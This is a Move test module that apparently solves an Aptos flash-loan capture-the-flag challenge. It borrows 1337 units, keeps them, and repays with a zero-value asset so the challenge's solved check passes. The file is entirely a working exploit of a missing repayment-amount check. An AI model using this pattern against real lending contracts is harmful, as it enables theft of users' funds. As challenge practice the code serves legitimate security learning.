module challenge::solution2 {
    use challenge::flash;
    use aptos_framework::signer;
    use aptos_framework::fungible_asset;
    use aptos_framework::primary_fungible_store;

    #[test(account = @1338, challenger = @challenger, aptos_framework = @0x1)]
    public entry fun solve(account: &signer, challenger: &signer) {
        flash::initialize(challenger);
        let loans = flash::flash_loan(account, 1337);
        let zero_repay = fungible_asset::zero(fungible_asset::asset_metadata(&loans));
        primary_fungible_store::deposit(signer::address_of(account), loans);
        flash::repay(account,zero_repay);
        flash::is_solved(account);
    }
}